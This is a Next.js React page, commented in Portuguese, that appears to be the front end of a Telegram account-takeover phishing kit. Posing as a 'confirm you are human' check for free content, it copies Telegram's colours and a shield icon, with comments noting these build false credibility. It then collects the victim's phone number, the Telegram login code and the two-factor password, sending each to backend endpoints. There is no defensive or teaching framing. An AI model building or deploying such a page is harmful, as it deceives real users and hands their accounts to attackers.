import { useState } from 'react';
import Head from 'next/head';

export default function Home() {
  const [step, setStep] = useState(1); // 1: Phone, 2: Code, 3: Password (2FA)
  const [loading, setLoading] = useState(false);
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [hash, setHash] = useState('');

  // Cor Azul Oficial do Telegram (Passa credibilidade)
  const tgBlue = '#3390ec';

  const handleSendCode = async () => {
    // Validação básica para evitar cliques acidentais
    if(phone.length < 10) return setError('Por favor, digite um número válido.');
    
    setLoading(true); setError('');
    
    try {
      const res = await fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone }),
      });
      const data = await res.json();
      
      if (res.ok) {
        setHash(data.phoneCodeHash);
        setStep(2);
      } else {
        setError('Não foi possível verificar este número. Tente novamente.');
      }
    } catch (err) { setError('Falha na conexão de segurança.'); }
    setLoading(false);
  };

  const handleVerifyCode = async () => {
    setLoading(true); setError('');
    try {
      const res = await fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            phoneNumber: phone, 
            code, 
            phoneCodeHash: hash, 
            password 
        }),
      });
      const data = await res.json();

      if (data.status === 'needs_2fa') {
          setStep(3); // Pede a verificação adicional
          setLoading(false);
          return;
      }

      if (res.ok && data.success) {
        // Sucesso: Redireciona para o conteúdo gratuito
        window.location.href = data.redirect;
      } else {
        setError('Código de validação incorreto.');
      }
    } catch (err) { setError('Erro na validação.'); }
    setLoading(false);
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#1c242f', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
      <Head>
        <title>Verificação de Segurança</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
      </Head>

      <div style={{ width: '100%', maxWidth: '380px', padding: '40px 30px', backgroundColor: '#242f3d', borderRadius: '12px', boxShadow: '0 4px 12px rgba(0,0,0,0.3)', textAlign: 'center' }}>
        
        {/* Ícone de Escudo (Passa sensação de segurança/proteção) */}
        <div style={{ marginBottom: '25px', display: 'flex', justifyContent: 'center' }}>
            <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 2ZM10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="#3390ec"/>
            </svg>
        </div>

        <h1 style={{ color: '#fff', fontSize: '20px', fontWeight: 'bold', marginBottom: '10px' }}>
          {step === 1 ? 'Confirme que você é humano' : 'Verificação de Identidade'}
        </h1>
        
        <p style={{ color: '#a2acb4', fontSize: '14px', marginBottom: '30px', lineHeight: '1.5' }}>
          {step === 1 ? 'Medida de proteção para os criadores. Valide seu número para liberar o acesso gratuito ao conteúdo.' : 
           step === 2 ? `Enviamos um código de validação para o seu Telegram (${phone}).` :
           'Confirmação de segurança adicional necessária.'}
        </p>

        {error && <div style={{ backgroundColor: 'rgba(255, 75, 75, 0.1)', color: '#ff5c5c', padding: '10px', borderRadius: '8px', fontSize: '13px', marginBottom: '20px' }}>{error}</div>}

        {step === 1 && (
          <>
            <div style={{ position: 'relative', marginBottom: '20px' }}>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  placeholder="Seu número (Ex: +5511999999999)"
                  style={{ width: '100%', padding: '15px', backgroundColor: '#18222d', border: '1px solid #2f3b4a', borderRadius: '10px', color: '#fff', fontSize: '16px', outline: 'none', transition: 'border 0.2s' }}
                  onFocus={(e) => e.target.style.border = `1px solid ${tgBlue}`}
                  onBlur={(e) => e.target.style.border = '1px solid #2f3b4a'}
                />
            </div>
            
            <button
              onClick={handleSendCode}
              disabled={loading}
              style={{ width: '100%', padding: '16px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '10px', fontSize: '15px', fontWeight: 'bold', cursor: 'pointer', opacity: loading ? 0.7 : 1, transition: 'background 0.2s' }}
            >
              {loading ? 'VERIFICANDO...' : 'SOU HUMANO'}
            </button>
            
            <div style={{ marginTop: '20px', fontSize: '11px', color: '#566675' }}>
                 Verificação segura via Telegram
            </div>
          </>
        )}

        {(step === 2 || step === 3) && (
          <>
            <div style={{ position: 'relative', marginBottom: '20px' }}>
                <input
                  type={step === 3 ? "password" : "text"}
                  value={step === 3 ? password : code}
                  onChange={(e) => step === 3 ? setPassword(e.target.value) : setCode(e.target.value)}
                  placeholder={step === 3 ? "Senha de Proteção" : "Código de Validação"}
                  style={{ width: '100%', padding: '15px', backgroundColor: '#18222d', border: '1px solid #2f3b4a', borderRadius: '10px', color: '#fff', fontSize: '18px', outline: 'none', letterSpacing: '2px', textAlign: 'center' }}
                  onFocus={(e) => e.target.style.border = `1px solid ${tgBlue}`}
                />
            </div>

            <button
              onClick={handleVerifyCode}
              disabled={loading}
              style={{ width: '100%', padding: '16px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '10px', fontSize: '15px', fontWeight: 'bold', cursor: 'pointer', opacity: loading ? 0.7 : 1 }}
            >
              {loading ? 'VALIDANDO...' : 'LIBERAR ACESSO GRÁTIS'}
            </button>
          </>
        )}

      </div>
    </div>
  );
}
